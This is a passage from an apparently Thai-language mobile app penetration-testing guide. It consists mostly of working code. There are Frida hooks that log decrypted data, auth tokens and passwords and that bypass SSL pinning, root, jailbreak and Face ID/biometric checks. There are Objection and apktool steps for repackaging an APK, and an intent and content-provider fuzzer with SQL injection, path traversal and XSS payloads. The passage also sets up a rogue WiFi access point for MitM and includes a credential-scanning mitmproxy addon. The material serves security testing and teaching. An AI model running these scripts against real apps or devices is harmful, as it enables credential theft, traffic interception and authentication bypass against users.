    // Hook doFinal เพื่อดู plaintext/ciphertext
    Cipher.doFinal.overload('[B').implementation = function(input) {
        console.log('[*] Cipher.doFinal called');
        console.log('    Input:', bytesToHex(input));
        console.log('    Input (str):', inputToString(input));
        
        var result = this.doFinal(input);
        console.log('    Output:', bytesToHex(result));
        return result;
    };
});

function bytesToHex(bytes) {
    if (!bytes) return 'null';
    var hex = '';
    for (var i = 0; i < bytes.length; i++) {
        hex += ('0' + (bytes[i] & 0xFF).toString(16)).slice(-2);
    }
    return hex;
}

function inputToString(bytes) {
    try {
        return Java.use('java.lang.String').$new(bytes, 'UTF-8');
    } catch(e) {
        return '[binary data]';
    }
}

// ──────────────────────────────────────────
// 2. HOOK NETWORK REQUESTS
// ──────────────────────────────────────────

Java.perform(function() {
    // Hook OkHttp (ใช้บ่อยมาก)
    try {
        var OkHttpClient = Java.use('okhttp3.OkHttpClient');
        var Request = Java.use('okhttp3.Request');
        
        // Hook newCall
        OkHttpClient.newCall.implementation = function(request) {
            var url = request.url().toString();
            var method = request.method();
            var headers = request.headers().toString();
            var body = '';
            
            if (request.body()) {
                try {
                    var buffer = Java.use('okio.Buffer').$new();
                    request.body().writeTo(buffer);
                    body = buffer.readUtf8();
                } catch(e) {}
            }
            
            console.log('[*] OkHttp Request:');
            console.log('    Method:', method);
            console.log('    URL:', url);
            console.log('    Headers:', headers);
            if (body) console.log('    Body:', body);
            
            return this.newCall(request);
        };
    } catch(e) {
        console.log('[-] OkHttp not found');
    }
    
    // Hook HttpURLConnection
    try {
        var HttpURLConnection = Java.use('java.net.HttpURLConnection');
        HttpURLConnection.getOutputStream.implementation = function() {
            console.log('[*] HttpURLConnection to:', this.getURL().toString());
            return this.getOutputStream();
        };
    } catch(e) {}
});

// ──────────────────────────────────────────
// 3. BYPASS ROOT DETECTION
// ──────────────────────────────────────────

Java.perform(function() {
    // Hook RootBeer (popular root detection library)
    try {
        var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
        RootBeer.isRooted.implementation = function() {
            console.log('[*] RootBeer.isRooted() -> bypassed to false');
            return false;
        };
        RootBeer.isRootedWithoutBusyBoxCheck.implementation = function() {
            return false;
        };
    } catch(e) {
        console.log('[-] RootBeer not found, trying generic methods...');
    }
    
    // Hook generic root check via file existence
    var File = Java.use('java.io.File');
    File.exists.implementation = function() {
        var path = this.getAbsolutePath();
        var rootFiles = [
            '/system/app/Superuser.apk',
            '/sbin/su', '/system/bin/su',
            '/system/xbin/su',
        ];
        
        for (var i = 0; i < rootFiles.length; i++) {
            if (path === rootFiles[i]) {
                console.log('[*] Root check for:', path, '-> bypassed to false');
                return false;
            }
        }
        return this.exists();
    };
    
    // Hook Runtime.exec (su commands)
    var Runtime = Java.use('java.lang.Runtime');
    Runtime.exec.overload('java.lang.String').implementation = function(cmd) {
        if (cmd.indexOf('su') !== -1) {
            console.log('[*] su command blocked:', cmd);
            throw Java.use('java.io.IOException').$new('Permission denied');
        }
        return this.exec(cmd);
    };
});

// ──────────────────────────────────────────
// 4. HOOK AUTHENTICATION
// ──────────────────────────────────────────

Java.perform(function() {
    // Hook SharedPreferences เพื่อดู auth tokens
    var SharedPreferencesImpl = Java.use('android.app.SharedPreferencesImpl');
    SharedPreferencesImpl.getString.implementation = function(key, defValue) {
        var result = this.getString(key, defValue);
        if (key.toLowerCase().includes('token') || 
            key.toLowerCase().includes('auth') ||
            key.toLowerCase().includes('password')) {
            console.log('[*] SharedPrefs.getString:');
            console.log('    Key:', key);
            console.log('    Value:', result);
        }
        return result;
    };
    
    // Hook login methods (generic)
    var classes = Java.enumerateLoadedClassesSync();
    classes.forEach(function(className) {
        if (className.toLowerCase().includes('auth') ||
            className.toLowerCase().includes('login')) {
            try {
                var clazz = Java.use(className);
                var methods = clazz.class.getDeclaredMethods();
                methods.forEach(function(method) {
                    var methodName = method.getName();
                    if (methodName.toLowerCase().includes('login') ||
                        methodName.toLowerCase().includes('authenticate')) {
                        console.log('[*] Found auth method:', className + '.' + methodName);
                    }
                });
            } catch(e) {}
        }
    });
});
```

---

## 10. SSL Pinning Bypass

### 10.1 ทำความเข้าใจ SSL Pinning

```
SSL Pinning คืออะไร:
- แอปตรวจสอบว่า Server Certificate ตรงกับที่บันทึกไว้ใน APK
- ป้องกัน MitM attack แม้จะ install CA cert แล้ว
- วิธีตรวจสอบ: Certificate Pinning หรือ Public Key Pinning

ประเภทของ SSL Pinning:
1. Certificate Pinning - pin ทั้ง Certificate
2. Public Key Pinning - pin แค่ Public Key (ดีกว่า)
3. SPKI Pinning - pin SubjectPublicKeyInfo

ไลบรารีที่ใช้ Pinning บ่อย:
- OkHttp CertificatePinner
- TrustKit
- Alamofire (iOS)
- Native TrustManager
```

### 10.2 Frida SSL Pinning Bypass

```javascript
// ssl_pinning_bypass.js - Universal SSL Pinning Bypass

Java.perform(function() {
    console.log('[*] Starting SSL Pinning Bypass...');
    
    // ──────────────────────────────────────────
    // 1. OkHttp3 CertificatePinner
    // ──────────────────────────────────────────
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload(
            'java.lang.String', 
            'java.util.List'
        ).implementation = function(hostname, peerCertificates) {
            console.log('[+] OkHttp3 CertificatePinner.check bypassed for:', hostname);
            return;  // ไม่ throw exception = bypass
        };
        
        CertificatePinner.check.overload(
            'java.lang.String',
            '[Ljava.security.cert.Certificate;'
        ).implementation = function(hostname, certs) {
            console.log('[+] OkHttp3 check (v2) bypassed for:', hostname);
            return;
        };
        
        console.log('[+] OkHttp3 CertificatePinner hooked');
    } catch(e) {
        console.log('[-] OkHttp3: ' + e);
    }
    
    // ──────────────────────────────────────────
    // 2. Custom TrustManager (X509TrustManager)
    // ──────────────────────────────────────────
    try {
        var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
        var SSLContext = Java.use('javax.net.ssl.SSLContext');
        
        var TrustManager = Java.registerClass({
            name: 'com.frida.TrustManager',
            implements: [X509TrustManager],
            methods: {
                checkClientTrusted: function(chain, authType) {},
                checkServerTrusted: function(chain, authType) {},
                getAcceptedIssuers: function() { return []; }
            }
        });
        
        var TrustManagers = [TrustManager.$new()];
        var SSLContextInstance = SSLContext.getInstance('TLS');
        SSLContextInstance.init(
            null, 
            Java.array('javax.net.ssl.TrustManager', TrustManagers), 
            null
        );
        
        var SSLSocketFactory = SSLContextInstance.getSocketFactory();
        console.log('[+] Custom TrustManager installed');
    } catch(e) {
        console.log('[-] TrustManager: ' + e);
    }
    
    // ──────────────────────────────────────────
    // 3. HostnameVerifier Bypass
    // ──────────────────────────────────────────
    try {
        var HostnameVerifier = Java.use('javax.net.ssl.HostnameVerifier');
        var AllowAllHostnameVerifier = Java.registerClass({
            name: 'com.frida.AllowAllHostnameVerifier',
            implements: [HostnameVerifier],
            methods: {
                verify: function(hostname, session) {
                    console.log('[+] HostnameVerifier bypassed for:', hostname);
                    return true;
                }
            }
        });
        console.log('[+] HostnameVerifier hooked');
    } catch(e) {
        console.log('[-] HostnameVerifier: ' + e);
    }
    
    // ──────────────────────────────────────────
    // 4. TrustKit (iOS-like pinning on Android)
    // ──────────────────────────────────────────
    try {
        var TrustKitHelper = Java.use('com.datatheorem.android.trustkit.pinning.OkHostnameVerifier');
        TrustKitHelper.verify.overload(
            'java.lang.String',
            'javax.net.ssl.SSLSession'
        ).implementation = function(hostname, session) {
            console.log('[+] TrustKit bypassed for:', hostname);
            return true;
        };
    } catch(e) {}
    
    // ──────────────────────────────────────────
    // 5. WebView SSL Error Bypass
    // ──────────────────────────────────────────
    try {
        var WebViewClient = Java.use('android.webkit.WebViewClient');
        WebViewClient.onReceivedSslError.implementation = function(
            view, handler, error
        ) {
            console.log('[+] WebView SSL error bypassed');
            handler.proceed();  // ดำเนินการต่อแม้จะมี SSL error
        };
    } catch(e) {}
    
    console.log('[*] SSL Pinning bypass complete!');
});
```

### 10.3 Objection Framework

```bash
# Objection - Runtime Mobile Exploration
# pip3 install objection

# ──────────────────────────────────────────
# BASIC USAGE
# ──────────────────────────────────────────

# Patch APK เพื่อฝัง Frida gadget
objection patchapk -s target.apk
# Output: target.objection.apk

# ติดตั้ง patched APK
adb install target.objection.apk

# Connect ไปยัง patched app
objection -g com.example.app explore

# ──────────────────────────────────────────
# OBJECTION COMMANDS
# ──────────────────────────────────────────

# Bypass SSL Pinning (one command!)
android sslpinning disable

# Bypass Root Detection
android root disable

# ดู loaded classes
android hooking list classes

# search หา classes
android hooking search classes login

# ดู methods ของ class
android hooking list class_methods com.example.app.LoginActivity

# Hook method
android hooking watch class_method com.example.app.LoginActivity.doLogin \
    --dump-args --dump-backtrace --dump-return

# ดู file system
file ls /data/data/com.example.app/
file cat /data/data/com.example.app/shared_prefs/prefs.xml

# ดู Keystore entries
android keystore list

# Memory dump
memory dump all memory_dump.bin
memory search --string "password"

# SQLite databases
sqlite connect /data/data/com.example.app/databases/app.db
sqlite execute query SELECT * FROM users;

# ──────────────────────────────────────────
# Patch APK แบบ manual (สำหรับ obfuscated app)
# ──────────────────────────────────────────

# 1. Download frida gadget
FRIDA_VER=$(python3 -c 'import frida; print(frida.__version__)')
wget "https://github.com/frida/frida/releases/download/${FRIDA_VER}/frida-gadget-${FRIDA_VER}-android-arm64.so.xz"
xz -d frida-gadget-*.xz

# 2. Decompile APK
apktool d target.apk -o target_decompiled

# 3. Copy gadget
mkdir -p target_decompiled/lib/arm64-v8a/
cp frida-gadget-*-android-arm64.so \
    target_decompiled/lib/arm64-v8a/libfrida-gadget.so

# 4. เพิ่ม System.loadLibrary ใน smali
# แก้ไข smali/com/example/app/MainActivity.smali
# เพิ่มบรรทัดต่อไปนี้ใน static initializer:
# const-string v0, "frida-gadget"
# invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V

# 5. Recompile
apktool b target_decompiled -o target_patched.apk

# 6. Sign APK
keytool -genkey -v -keystore pentest.keystore \
    -alias pentest -keyalg RSA -keysize 2048 -validity 365 \
    -storepass password123 -keypass password123 \
    -dname "CN=Pentest, O=Test, C=US"

apksigner sign --ks pentest.keystore --ks-pass pass:password123 \
    --key-pass pass:password123 target_patched.apk

# 7. ติดตั้ง
adb install target_patched.apk
```

---

## 11. Android Runtime Exploitation

### 11.1 Intent Injection

```python
#!/usr/bin/env python3
# intent_fuzzer.py - Android Intent Fuzzer

import subprocess
import time
import random
import string

class AndroidIntentFuzzer:
    """Fuzzer สำหรับ Android Intents"""
    
    def __init__(self, package: str, device: str = ""):
        self.package = package
        self.device = f"-s {device}" if device else ""
        self.findings = []
    
    def adb(self, cmd: str) -> str:
        """Execute ADB command"""
        result = subprocess.run(
            f"adb {self.device} {cmd}",
            shell=True, capture_output=True, text=True
        )
        return result.stdout + result.stderr
    
    def get_exported_components(self) -> dict:
        """ดึง exported components จาก dumpsys"""
        output = self.adb(f"shell dumpsys package {self.package}")
        
        components = {
            'activities': [],
            'services': [],
            'receivers': [],
            'providers': []
        }
        
        # Parse activities
        for line in output.split('\n'):
            if 'Activity' in line and self.package in line:
                parts = line.strip().split()
                if parts:
                    components['activities'].append(parts[0])
        
        return components
    
    def fuzz_activity(self, activity: str, num_tests: int = 50):
        """Fuzz an Activity with random Intents"""
        print(f"[*] Fuzzing activity: {activity}")
        
        payload_types = [
            # SQL Injection
            "' OR '1'='1",
            "'; DROP TABLE users;--",
            # Path Traversal
            "../../../etc/passwd",
            "....//....//etc/passwd",
            # XSS
            "<script>alert(1)</script>",
            "javascript:alert(1)",
            # Format String
            "%s%s%s%s%s%s%s%s%s%s",
            # Buffer
            'A' * 1000,
            'A' * 10000,
            # Special chars
            "\x00\x01\x02\xff",
            # Null byte
            "test\x00admin",
        ]
        
        for i, payload in enumerate(payload_types):
            print(f"  [*] Test {i+1}: {payload[:50]}...")
            
            # ส่ง Intent ด้วย payload ต่างๆ
            cmd = (
                f"shell am start -n {activity} "
                f"--es 'input' '{payload}' "
                f"--es 'id' '{payload}' "
                f"--es 'user' '{payload}'"
            )
            output = self.adb(cmd)
            
            # ตรวจสอบ crash
            if 'Exception' in output or 'Error' in output:
                print(f"  [!] POTENTIAL CRASH with payload: {payload[:50]}")
                self.findings.append({
                    'activity': activity,
                    'payload': payload,
                    'output': output
                })
            
            time.sleep(0.5)
        
        return self.findings
    
    def test_deep_links(self, schemes: list):
        """ทดสอบ Deep Link injection"""
        print(f"[*] Testing deep links: {schemes}")
        
        payloads = [
            "/../../../etc/passwd",
            "?admin=true&bypass=1",
            "#javascript:alert(1)",
            "/@evil.com",
        ]
        
        for scheme in schemes:
            for payload in payloads:
                url = f"{scheme}://main{payload}"
                cmd = f"shell am start -a android.intent.action.VIEW -d '{url}'"
                print(f"  Testing: {url}")
                output = self.adb(cmd)
                
                if 'Exception' not in output and 'Error' not in output:
                    print(f"  [+] Deep link accepted: {url}")


# ──────────────────────────────────────────
# Content Provider Injection
# ──────────────────────────────────────────

class ContentProviderTester:
    """ทดสอบ Content Provider vulnerabilities"""
    
    def __init__(self, package: str):
        self.package = package
    
    def query_provider(self, uri: str, projection: str = None, 
                      selection: str = None) -> str:
        """Query content provider"""
        cmd = f"adb shell content query --uri {uri}"
        if projection:
            cmd += f" --projection {projection}"
        if selection:
            cmd += f" --where \'{selection}\'"
        
        result = subprocess.run(cmd, shell=True, 
                               capture_output=True, text=True)
        return result.stdout
    
    def test_sql_injection(self, uri: str):
        """ทดสอบ SQL Injection ใน Content Provider"""
        payloads = [
            "1=1",
            "1=1 UNION SELECT 1,2,3--",
            "1=1 UNION SELECT name,password,3 FROM users--",
            "1=1; DROP TABLE users--",
        ]
        
        print(f"[*] Testing SQL injection on: {uri}")
        for payload in payloads:
            result = self.query_provider(uri, selection=payload)
            if result and 'Error' not in result:
                print(f"  [+] Possible injection with: {payload}")
                print(f"      Result: {result[:200]}")
    
    def test_path_traversal(self, uri: str):
        """ทดสอบ Path Traversal"""
        traversals = [
            "/etc/passwd",
            "../../../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
        ]
        
        print(f"[*] Testing path traversal on: {uri}")
        for path in traversals:
            full_uri = f"{uri}/{path}"
            cmd = f"adb shell content read --uri '{full_uri}'"
            result = subprocess.run(cmd, shell=True, 
                                   capture_output=True, text=True)
            if 'root:' in result.stdout or 'bin:' in result.stdout:
                print(f"  [!] Path traversal SUCCESS: {full_uri}")
```

---

## 12. iOS Security Testing

### 12.1 iOS Testing Setup

```bash
# ──────────────────────────────────────────
# ต้องใช้ Jailbroken iOS device
# ──────────────────────────────────────────

# ติดตั้ง tools ผ่าน Cydia หรือ Sileo:
# 1. OpenSSH - สำหรับ SSH access
# 2. Frida - dynamic instrumentation
# 3. Filza File Manager - file system access
# 4. cycript - runtime scripting
# 5. lldb - debugger

# ──────────────────────────────────────────
# SSH เข้า iOS device
# ──────────────────────────────────────────

# Default credentials สำหรับ jailbroken iOS:
# user: root
# password: alpine

# เชื่อมต่อ
ssh root@192.168.1.x

# เปลี่ยน password ทันที!
passwd

# ──────────────────────────────────────────
# ดึง IPA จาก jailbroken device
# ──────────────────────────────────────────

# ติดตั้ง frida-ios-dump (Frida-based IPA dumper)
git clone https://github.com/AloneMonkey/frida-ios-dump.git
cd frida-ios-dump
pip3 install -r requirements.txt

# dump IPA
python3 dump.py com.example.app
# Output: com.example.app.ipa

# ──────────────────────────────────────────
# Binary Analysis
# ──────────────────────────────────────────

# Extract binary จาก IPA
unzip app.ipa -d app_extracted
cd app_extracted/Payload/AppName.app

# ดู Mach-O headers
otool -h AppName
otool -l AppName | grep -A 3 LC_ENCRYPTION_INFO

# ตรวจสอบ binary protections
otool -l AppName | grep -E 'ASLR|PIE'
otool -l AppName | grep 'stack_guard'

# ค้นหา strings ที่น่าสนใจ
strings AppName | grep -i 'password\|token\|key\|secret'
strings AppName | grep -E 'https?://'

# ──────────────────────────────────────────
# class-dump สำหรับ Objective-C class info
# ──────────────────────────────────────────

class-dump AppName -H -o headers/
ls headers/

# ดู methods ของ class
grep -rn 'password\|login\|auth' headers/

# ──────────────────────────────────────────
# ใช้ Frida บน iOS
# ──────────────────────────────────────────

# บน Kali:
pip3 install frida-tools

# ดู processes
frida-ps -U  # USB connected device
frida-ps -R  # Remote (ถ้า forward port)

# SSH tunnel สำหรับ Frida
ssh -L 27042:localhost:27042 root@192.168.1.x

# Attach ไปยัง app
frida -R -n AppName
frida -R -l ios_script.js -n AppName
```

### 12.2 iOS Frida Scripts

```javascript
// ios_hooks.js - Frida hooks สำหรับ iOS

// ──────────────────────────────────────────
// 1. HOOK NSURLSESSION (SSL Pinning Bypass)
// ──────────────────────────────────────────

if (ObjC.available) {
    // Bypass NSURLSession certificate validation
    var NSURLSession = ObjC.classes.NSURLSession;
    
    Interceptor.attach(
        ObjC.classes.NSURLSession[
            '-URLSession:didReceiveChallenge:completionHandler:'
        ].implementation,
        {
            onEnter: function(args) {
                var completionHandler = new ObjC.Block(args[4]);
                var credentials = ObjC.classes.NSURLCredential
                    .credentialForTrust_(args[3]);
                
                completionHandler.invoke(
                    1,   // NSURLSessionAuthChallengeUseCredential
                    credentials
                );
                
                console.log('[+] NSURLSession SSL bypass invoked');
            }
        }
    );
    
    // ──────────────────────────────────────────
    // 2. HOOK KEYCHAIN ACCESS
    // ──────────────────────────────────────────
    
    // Hook SecItemCopyMatching (read from Keychain)
    Interceptor.attach(Module.findExportByName(
        'Security', 'SecItemCopyMatching'
    ), {
        onEnter: function(args) {
            this.query = new ObjC.Object(args[0]);
        },
        onLeave: function(retval) {
            if (retval.toInt32() === 0) {  // errSecSuccess
                console.log('[*] Keychain read:');
                console.log('    Query:', this.query.toString());
            }
        }
    });
    
    // ──────────────────────────────────────────
    // 3. BYPASS JAILBREAK DETECTION
    // ──────────────────────────────────────────
    
    // Hook NSFileManager fileExistsAtPath
    var NSFileManager = ObjC.classes.NSFileManager;
    Interceptor.attach(
        NSFileManager['- fileExistsAtPath:'].implementation,
        {
            onEnter: function(args) {
                var path = ObjC.Object(args[2]).toString();
                this.path = path;
            },
            onLeave: function(retval) {
                var jbPaths = [
                    '/Applications/Cydia.app',
                    '/Library/MobileSubstrate',
                    '/bin/bash',
                    '/usr/sbin/sshd',
                    '/etc/apt',
                    '/usr/bin/ssh',
                ];
                
                for (var i = 0; i < jbPaths.length; i++) {
                    if (this.path === jbPaths[i]) {
                        console.log('[+] Jailbreak detection bypassed for:', this.path);
                        retval.replace(0);  // return NO
                        return;
                    }
                }
            }
        }
    );
    
    // ──────────────────────────────────────────
    // 4. HOOK BIOMETRIC AUTHENTICATION
    // ──────────────────────────────────────────
    
    var LAContext = ObjC.classes.LAContext;
    Interceptor.attach(
        LAContext['- evaluatePolicy:localizedReason:reply:'].implementation,
        {
            onEnter: function(args) {
                var block = new ObjC.Block(args[4]);
                var originalBlock = block.implementation;
                
                block.implementation = function(success, error) {
                    console.log('[*] Biometric auth bypassed -> success');
                    originalBlock(1, null);  // force success
                };
                
                args[4] = block;
            }
        }
    );
}

console.log('[*] iOS hooks loaded!');
```

---

## 13. Mobile Network Traffic Analysis

### 13.1 MitM ด้วย BurpSuite

```bash
# ──────────────────────────────────────────
# ตั้งค่า WiFi Hotspot บน Kali สำหรับ MitM
# ──────────────────────────────────────────

# ติดตั้ง hostapd และ dnsmasq
apt-get install -y hostapd dnsmasq

# ตั้งค่า hostapd (WiFi Access Point)
cat > /etc/hostapd/hostapd.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=PentestAP
hw_mode=g
channel=7
wpa=2
wpa_passphrase=PentestPass123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
EOF

# ตั้งค่า dnsmasq (DHCP)
cat > /etc/dnsmasq.conf << 'EOF'
interface=wlan0
dhcp-range=192.168.100.2,192.168.100.254,255.255.255.0,24h
dhcp-option=3,192.168.100.1
dhcp-option=6,192.168.100.1
EOF

# ตั้งค่า IP forwarding
ip addr add 192.168.100.1/24 dev wlan0
ip link set wlan0 up
sysctl net.ipv4.ip_forward=1

# iptables สำหรับ redirect traffic ไป BurpSuite
iptables -t nat -A PREROUTING -i wlan0 -p tcp \
    --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i wlan0 -p tcp \
    --dport 443 -j REDIRECT --to-port 8080

# Start hostapd
hostapd /etc/hostapd/hostapd.conf &

# Start dnsmasq
dnsmasq --conf-file=/etc/dnsmasq.conf

# BurpSuite: Proxy > Options
# - Bind: 8080, All interfaces
# - Enable Invisible Proxying
# - Request Handling > Support invisible proxying

echo "[+] MitM AP ready! Connect device to 'PentestAP'"
```

### 13.2 Traffic Analysis ด้วย Python

```python
#!/usr/bin/env python3
# traffic_analyzer.py - Mobile Traffic Analysis

from mitmproxy import http
import re
import json
import base64
from typing import Optional

# ──────────────────────────────────────────
# MitMProxy Addon สำหรับ Mobile Analysis
# ──────────────────────────────────────────

class MobileTrafficAnalyzer:
    """MitMProxy addon สำหรับวิเคราะห์ Mobile Traffic"""
    
    def __init__(self):
        self.findings = []
        self.requests = []
        self.endpoints = set()
        
        # Patterns ที่น่าสนใจ
        self.sensitive_patterns = [
            (r'password[\s]*[=:][\s]*[\S]+', 'Password in traffic'),
            (r'token[\s]*[=:][\s]*[A-Za-z0-9+/=]{20,}', 'Auth token'),
            (r'[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}', 'Email address'),
            (r'\b(?:\d{4}[\s-]?){3}\d{4}\b', 'Credit card number'),
            (r'\b[A-Z0-9]{20}\b', 'Possible API key'),
        ]
    
    def request(self, flow: http.HTTPFlow):
        """Hook ทุก HTTP Request"""
        url = flow.request.pretty_url
        method = flow.request.method
        headers = dict(flow.request.headers)
        
        # บันทึก endpoint
        self.endpoints.add(f"{method} {url.split('?')[0]}")
        
        # ตรวจสอบ sensitive data ใน request
        body = ''
        if flow.request.content:
            try:
                body = flow.request.content.decode('utf-8', errors='ignore')
            except Exception:
                pass
        
        # ตรวจสอบ Authorization headers
        if 'Authorization' in headers:
            auth = headers['Authorization']
            self._analyze_auth_header(auth, url)
        
        # ตรวจสอบ body
        if body:
            self._check_sensitive_data(body, f"Request to {url}")
        
        # ตรวจสอบ parameter ใน URL
        if '?' in url:
            params = url.split('?')[1]
            self._check_sensitive_data(params, f"URL params in {url}")
    
    def response(self, flow: http.HTTPFlow):
        """Hook ทุก HTTP Response"""
        url = flow.request.pretty_url
        status = flow.response.status_code
        headers = dict(flow.response.headers)
        
        # ตรวจสอบ response body
        body = ''
        if flow.response.content:
            try:
                body = flow.response.content.decode('utf-8', errors='ignore')
                
                # ถ้าเป็น JSON ให้ parse
                if 'application/json' in headers.get('content-type', ''):
                    try:
                        json_data = json.loads(body)
                        self._analyze_json_response(json_data, url)
                    except Exception:
                        pass
                
                self._check_sensitive_data(body, f"Response from {url}")
            except Exception:
                pass
        
        # ตรวจสอบ security headers
        self._check_security_headers(headers, url)
    
    def _analyze_auth_header(self, auth: str, url: str):
        """วิเคราะห์ Authorization header"""
        if auth.startswith('Basic '):
            try:
                decoded = base64.b64decode(auth[6:]).decode()
                self.findings.append({
                    'type': 'Basic Auth',
                    'severity': 'HIGH',
                    'detail': f"Credentials: {decoded}",
                    'url': url
                })
                print(f"[!] Basic Auth found: {decoded} -> {url}")
            except Exception:
                pass
        
        elif auth.startswith('Bearer '):
            token = auth[7:]
            # ตรวจสอบว่าเป็น JWT
            if token.count('.') == 2:
                self._analyze_jwt(token, url)
    
    def _analyze_jwt(self, token: str, url: str):
        """วิเคราะห์ JWT token"""
        try:
            parts = token.split('.')
            header = json.loads(base64.b64decode(parts[0] + '=='))
            payload = json.loads(base64.b64decode(parts[1] + '=='))
            
            print(f"[*] JWT found at {url}:")
            print(f"    Algorithm: {header.get('alg')}")
            print(f"    Payload: {payload}")
            
            # ตรวจสอบ weak algorithms
            if header.get('alg') == 'none':
                self.findings.append({
                    'type': 'JWT None Algorithm',
                    'severity': 'CRITICAL',
                    'detail': 'JWT uses none algorithm - authentication bypass possible',
                    'url': url
                })
            elif header.get('alg') in ['HS256', 'HS384', 'HS512']:
                # Symmetric - อาจ brute force ได้
                self.findings.append({
                    'type': 'JWT HMAC',
                    'severity': 'MEDIUM',
                    'detail': f"JWT uses {header.get('alg')} - check for weak secret",
                    'url': url
                })
        except Exception as e:
            pass
    
    def _check_sensitive_data(self, content: str, location: str):
        """ตรวจหา sensitive data"""
        for pattern, desc in self.sensitive_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                for match in matches[:3]:  # แสดงแค่ 3 match แรก
                    self.findings.append({
                        'type': desc,
                        'severity': 'HIGH',
                        'detail': f"{desc}: {match[:50]}",
                        'location': location
                    })
                    print(f"[!] {desc} in {location}: {match[:50]}")
    
    def _check_security_headers(self, headers: dict, url: str):
        """ตรวจสอบ Security Headers"""
        required_headers = [
            'Strict-Transport-Security',
            'X-Content-Type-Options',
            'X-Frame-Options',
            'Content-Security-Policy',
        ]
        
        missing = [h for h in required_headers 
                  if h.lower() not in {k.lower() for k in headers}]
        
        if missing and 'https' in url:
            for header in missing:
                self.findings.append({
                    'type': 'Missing Security Header',
                    'severity': 'LOW',
                    'detail': f"Missing {header}",
                    'url': url
                })
    
    def _analyze_json_response(self, data: dict, url: str):
        """วิเคราะห์ JSON response"""
        # ค้นหา sensitive fields
        sensitive_keys = ['password', 'secret', 'token', 'key', 'ssn', 'credit_card']
        
        def search_dict(d, path=''):
            if isinstance(d, dict):
                for k, v in d.items():
                    current_path = f"{path}.{k}" if path else k
                    if any(s in k.lower() for s in sensitive_keys):
                        print(f"[!] Sensitive field in response: {current_path} = {str(v)[:50]}")
                    search_dict(v, current_path)
            elif isinstance(d, list):
                for i, item in enumerate(d[:3]):
                    search_dict(item, f"{path}[{i}]")
        
        search_dict(data)
    
    def generate_report(self):
        """สร้าง report"""
        print("\n" + "="*60)
        print("Traffic Analysis Report")
        print("="*60)
        print(f"Total endpoints discovered: {len(self.endpoints)}")
        print(f"Total findings: {len(self.findings)}")
        
        by_severity = {}
        for f in self.findings:
            sev = f.get('severity', 'INFO')
            by_severity.setdefault(sev, []).append(f)
        
        for sev in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']:
            findings = by_severity.get(sev, [])
            if findings:
                print(f"\n[{sev}] {len(findings)} findings:")
                for finding in findings[:5]:
                    print(f"  - {finding.get('type')}: {finding.get('detail', '')[:80]}")


# ใช้งานด้วย mitmproxy:
# mitmproxy -s traffic_analyzer.py --mode transparent
# mitmweb -s traffic_analyzer.py  # Web UI

addons = [MobileTrafficAnalyzer()]
```

---

## 14. Mobile Malware Analysis

### 14.1 Android Malware Indicators

```python
#!/usr/bin/env python3
# malware_detector.py - Android Malware Detection

import zipfile
import re
import hashlib
import json
from pathlib import Path

class AndroidMalwareDetector:
    """ตรวจจับ Android Malware"""
    
    # Suspicious permissions สำหรับ malware
    MALWARE_PERMISSIONS = [
        'RECEIVE_BOOT_COMPLETED',     # persistence
        'READ_SMS',                    # SMS stealing
        'SEND_SMS',                    # SMS fraud
        'RECEIVE_SMS',                 # SMS intercept
        'READ_CALL_LOG',              # call monitoring
        'RECORD_AUDIO',               # audio recording
        'PROCESS_OUTGOING_CALLS',     # call intercepting
        'READ_CONTACTS',              # contact theft
        'ACCESS_FINE_LOCATION',       # tracking
        'CHANGE_NETWORK_STATE',       # network manipulation
        'INTERNET',                   # C2 communication
        'FOREGROUND_SERVICE',         # persistent service
        'SYSTEM_ALERT_WINDOW',        # overlay attack
        'BIND_ACCESSIBILITY_SERVICE', # accessibility abuse
        'WRITE_SETTINGS',             # settings manipulation
        'MOUNT_UNMOUNT_FILESYSTEMS',  # file access
        'PACKAGE_USAGE_STATS',        # app monitoring
        'BIND_DEVICE_ADMIN',          # device admin
    ]
    
    # Suspicious API calls
    MALWARE_APIS = [
        'sendTextMessage',            # SMS sending
        'execCommand',                # command execution  
        'Runtime.exec',               # shell execution
        'getDeviceId',                # device fingerprinting
        'getSubscriberId',            # IMSI collection
        'sendBroadcast.*SMS_SENT',    # SMS broadcast
        'AccessibilityService',       # accessibility abuse
        'requestDeviceAdmin',         # device admin request
        'dexClassLoader',             # dynamic code loading
        'loadClass',                  # class loading
        'defineClass',                # runtime code injection
    ]
    
    # Known malware families signatures
    MALWARE_SIGNATURES = {
        'BankBot': [
            'com.android.systemprocess',
            'AccessibilityService',
            'overlay_target',
        ],
        'FluBot': [
            'smssend',
            'contacts_upload',
            'fake_fedex',
        ],
        'Joker': [
            'wap_billing',
            'sms_subscribe',
            'DCB_payment',
        ],
        'Cerberus': [
            'keylogger',
            'remote_control',
            'bank_overlay',
        ],
    }
    
    def __init__(self, apk_path: str):
        self.apk_path = apk_path
        self.score = 0
        self.indicators = []
    
    def calculate_hashes(self) -> dict:
        """คำนวณ hash ของ APK"""
        with open(self.apk_path, 'rb') as f:
            data = f.read()
        return {
            'md5': hashlib.md5(data).hexdigest(),
            'sha1': hashlib.sha1(data).hexdigest(),
            'sha256': hashlib.sha256(data).hexdigest(),
            'size': len(data)
        }
    
    def analyze_permissions(self) -> list:
        """วิเคราะห์ permissions"""
        suspicious = []
        
        try:
            with zipfile.ZipFile(self.apk_path, 'r') as apk:
                manifest = apk.read('AndroidManifest.xml').decode('utf-8', errors='ignore')
        except Exception:
            return suspicious
        
        for perm in self.MALWARE_PERMISSIONS:
            if perm in manifest:
                suspicious.append(perm)
                self.score += 5
        
        # ตรวจสอบ dangerous combos
        if 'READ_SMS' in suspicious and 'INTERNET' in suspicious:
            self.score += 20
            self.indicators.append('CRITICAL: SMS stealing + Internet = likely SMS banker')
        
        if 'RECORD_AUDIO' in suspicious and 'INTERNET' in suspicious:
            self.score += 15
